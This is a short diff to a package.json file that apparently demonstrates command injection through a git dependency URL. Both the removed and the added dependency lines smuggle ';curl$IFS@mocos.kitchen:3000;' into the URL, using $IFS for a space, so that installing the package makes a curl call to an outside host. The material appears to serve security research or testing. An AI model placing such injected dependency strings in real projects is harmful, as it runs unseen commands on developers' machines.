@@ -5,6 +5,6 @@
   "license": "MIT",
   "private": true,
   "dependencies": {
-    "package1": "git+https://github.com/tyage/sample-package.git?;curl$IFS@mocos.kitchen:3000;/github.com/tyage/tyage-sample-package.git#semver:4.0.0"
+    "package1": "git+https://github.com/tyage/sample-package.git/;curl$IFS@mocos.kitchen:3000;/../../sample-package.git#semver:4.0.0"
   }
 }
